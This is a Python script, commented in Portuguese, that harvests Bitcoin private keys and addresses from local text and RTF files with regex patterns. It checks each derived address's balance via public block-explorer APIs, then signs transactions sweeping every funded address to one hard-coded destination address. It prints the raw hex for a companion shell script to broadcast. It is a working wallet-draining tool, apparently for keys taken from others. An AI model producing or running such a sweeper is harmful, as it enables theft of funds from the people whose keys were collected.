import requests  # CORRIGIDO: Adicionado 'import' e tudo em minúsculo
import re
import time
import sys       # Adicionado para forçar a saída de dados
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = 'bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk'
FILES_TO_SCAN = ['privatekeys.txt', 'priv.key.rtf', 'chavprivelet1.txt', 'chaves_extraidas_e_enderecos_1.txt']

def deep_clean_rtf(raw_content):
    """Remove metadados RTF agressivamente para unir strings quebradas"""
    text = re.sub(r'\\[a-z0-9]+(?:\s|-?\d+)?', '', raw_content)
    text = re.sub(r'[{}]', '', text)
    return "".join(text.split())

def check_balance_api(address):
    """Consulta saldo com fallback imediato"""
    for api_url in [f"https://mempool.space/api/address/{address}", f"https://blockstream.info/api/address/{address}"]:
        try:
            r = requests.get(api_url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                stats = data.get('chain_stats', {})
                return stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
        except: continue
    return 0

def create_hex_transaction(addr, wif, utxos_val):
    """Prepara o HEX para o broadcast via Shell"""
    try:
        # Busca UTXOs detalhados para assinar
        r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=15)
        if r.status_code != 200: return
        
        utxos = r.json()
        tx = Transaction(network='bitcoin')
        fee = 25000 # Taxa aumentada para garantir aceitação pelas APIs
        amount = utxos_val - fee
        
        if amount > 1000:
            for u in utxos:
                tx.add_input(prev_txid=u['txid'], output_n=u['vout'], value=u['value'], address=addr)
            tx.add_output(value=amount, address=DEST_ADDRESS)
            tx.sign([wif])
            # IMPORTANTE: O prefixo HEX_GEN: é o que o script Shell procura
            print(f"HEX_GEN:{tx.raw_hex()}")
            sys.stdout.flush() # Garante que o Shell veja a linha na hora
    except Exception as e:
        print(f"Erro ao gerar transação: {e}")

def run_nuclear_scan():
    print("☢️ INICIANDO VARREDURA...")
    sys.stdout.flush()
    raw_strings = []
    
    for file_path in FILES_TO_SCAN:
        try:
            with open(file_path, 'r', errors='ignore') as f:
                content = f.read()
                if file_path.endswith('.rtf'):
                    content = deep_clean_rtf(content)
                
                raw_strings.extend(re.findall(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}', content))
                raw_strings.extend(re.findall(r'bc1[a-z0-9]{39,59}', content))
                raw_strings.extend(re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content))
                raw_strings.extend(re.findall(r'\b[0-9a-fA-F]{64}\b', content))
        except: continue

    unique_items = set(raw_strings)
    print(f"📊 Itens identificados: {len(unique_items)}")
    sys.stdout.flush()

    for item in unique_items:
        if item.startswith(('1', '3', 'bc1')):
            bal = check_balance_api(item)
            if bal > 0:
                print(f"🚨 SALDO DETECTADO: {item} | {bal} sats")
                sys.stdout.flush()
        
        elif len(item) >= 50:
            for comp in [True, False]:
                try:
                    k = Key(item, network='bitcoin', compressed=comp)
                    for addr in [k.address(), k.address(witness_type='p2sh-p2wpkh'), k.address(witness_type='p2wpkh')]:
                        bal = check_balance_api(addr)
                        if bal > 0:
                            create_hex_transaction(addr, item, bal)
                except: continue
        time.sleep(0.1)

if __name__ == "__main__":
    run_nuclear_scan()
